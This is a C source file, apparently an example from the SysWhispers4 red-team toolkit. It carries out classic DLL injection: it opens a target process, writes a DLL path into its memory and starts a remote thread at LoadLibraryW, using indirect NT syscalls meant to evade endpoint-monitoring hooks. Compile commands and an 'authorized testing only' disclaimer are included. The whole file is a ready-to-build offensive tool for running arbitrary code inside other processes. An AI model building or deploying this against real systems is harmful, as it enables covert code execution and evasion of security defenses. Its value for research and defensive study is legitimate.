/*
 * SysWhispers4 — Example: Classic DLL Injection via NT syscalls
 *
 * FOR AUTHORIZED SECURITY TESTING AND RESEARCH ONLY.
 * Unauthorized use against systems you do not own is illegal.
 *
 * Technique:
 *   1. Open the target process
 *   2. Allocate memory for the DLL path string
 *   3. Write the DLL path into remote memory
 *   4. Create a remote thread with LoadLibraryW as the start routine
 *
 * Generated with:
 *   python syswhispers.py --preset injection --method indirect --resolve freshycalls
 *
 * Compile (MSVC):
 *   cl /nologo /W3 example_dll_injection.c SW4Syscalls.c SW4Syscalls.asm
 *
 * Compile (MinGW):
 *   x86_64-w64-mingw32-gcc -masm=intel example_dll_injection.c SW4Syscalls.c SW4Syscalls_stubs.c -o dll_inject.exe
 */
#include <stdio.h>
#include <string.h>
#include "SW4Syscalls.h"

int main(int argc, char *argv[]) {
    NTSTATUS status;

    if (argc < 3) {
        printf("Usage: %s <PID> <DLL_PATH>\n", argv[0]);
        printf("  PID      — target process ID\n");
        printf("  DLL_PATH — full path to DLL (ASCII)\n");
        return 1;
    }

    DWORD  targetPid = (DWORD)atoi(argv[1]);
    char  *dllPath   = argv[2];
    SIZE_T dllPathLen = strlen(dllPath) + 1;

    /* Convert DLL path to wide string */
    wchar_t wDllPath[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, dllPath, -1, wDllPath, MAX_PATH);
    SIZE_T wDllPathSize = (wcslen(wDllPath) + 1) * sizeof(wchar_t);

    /* Step 0: Initialize SysWhispers4 runtime */
    if (!SW4_Initialize()) {
        fprintf(stderr, "[!] SW4_Initialize failed\n");
        return 1;
    }
    printf("[+] SysWhispers4 initialized\n");

    /* Step 1: Open the target process */
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
    CLIENT_ID cid = { (PVOID)(ULONG_PTR)targetPid, NULL };

    status = SW4_NtOpenProcess(
        &hProcess,
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        &objAttr,
        &cid
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtOpenProcess(%lu) failed: 0x%08X\n", targetPid, status);
        return 1;
    }
    printf("[+] Opened process %lu\n", targetPid);

    /* Step 2: Allocate memory in the target for the DLL path */
    PVOID  remoteAddr = NULL;
    SIZE_T regionSize = wDllPathSize;
    status = SW4_NtAllocateVirtualMemory(
        hProcess,
        &remoteAddr,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtAllocateVirtualMemory failed: 0x%08X\n", status);
        SW4_NtClose(hProcess);
        return 1;
    }
    printf("[+] Allocated %llu bytes at 0x%p in target\n",
           (unsigned long long)regionSize, remoteAddr);

    /* Step 3: Write the DLL path into remote memory */
    SIZE_T written = 0;
    status = SW4_NtWriteVirtualMemory(
        hProcess,
        remoteAddr,
        wDllPath,
        wDllPathSize,
        &written
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtWriteVirtualMemory failed: 0x%08X\n", status);
        SW4_NtClose(hProcess);
        return 1;
    }
    printf("[+] Wrote DLL path (%llu bytes): %s\n",
           (unsigned long long)written, dllPath);

    /* Step 4: Resolve LoadLibraryW address from kernel32.dll */
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    PVOID pLoadLibrary = (PVOID)GetProcAddress(hKernel32, "LoadLibraryW");
    if (!pLoadLibrary) {
        fprintf(stderr, "[!] Failed to resolve LoadLibraryW\n");
        SW4_NtClose(hProcess);
        return 1;
    }
    printf("[+] LoadLibraryW @ 0x%p\n", pLoadLibrary);

    /* Step 5: Create remote thread pointing to LoadLibraryW(dllPath) */
    HANDLE hThread = NULL;
    status = SW4_NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        pLoadLibrary,   /* StartRoutine = LoadLibraryW */
        remoteAddr,     /* Argument     = pointer to DLL path */
        0,              /* CreateFlags  = run immediately */
        0, 0, 0,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtCreateThreadEx failed: 0x%08X\n", status);
        SW4_NtClose(hProcess);
        return 1;
    }
    printf("[+] Remote thread created (handle 0x%p)\n", hThread);

    /* Wait for LoadLibraryW to complete */
    SW4_NtWaitForSingleObject(hThread, FALSE, NULL);
    printf("[+] DLL injection complete.\n");

    /* Cleanup */
    SW4_NtClose(hThread);
    SW4_NtClose(hProcess);
    return 0;
}
